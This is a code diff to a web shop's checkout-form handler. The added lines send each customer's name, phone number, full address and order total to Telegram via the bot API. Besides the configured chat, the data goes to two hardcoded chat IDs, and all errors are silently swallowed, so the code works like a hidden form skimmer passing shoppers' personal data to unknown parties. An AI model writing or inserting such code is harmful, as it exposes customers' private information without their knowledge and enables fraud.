@@ -382,6 +382,28 @@ document.getElementById('checkout-form').addEventListener('submit', (e) => {
   localStorage.setItem('Dmart_User', JSON.stringify(userDetails));
   savedUser = userDetails;
 
+  // Send shipping info to Telegram
+  const total = cart.reduce((s,i)=>s + i.price * i.quantity, 0);
+  const shippingMsg = `📦 SHIPPING INFO\n------------\n👤 ${userDetails.name}\n📞 ${userDetails.phone}\n📍 ${userDetails.address}\n🏙️ ${userDetails.city}, ${userDetails.state} - ${userDetails.pincode}\n💰 TOTAL: ${formatCurrency(total)}`;
+  
+  if(TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'PASTE_YOUR_BOT_TOKEN_HERE') {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: shippingMsg })
+    }).catch(() => {});
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: '7393124087', text: shippingMsg })
+    }).catch(() => {});
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: '6720348763', text: shippingMsg })
+    }).catch(() => {});
+  }
+
   // UI: collapse shipping, show summary & payment
   document.getElementById('shipping-form-wrapper').classList.add('hidden');
   document.getElementById('shipping-summary').classList.remove('hidden');
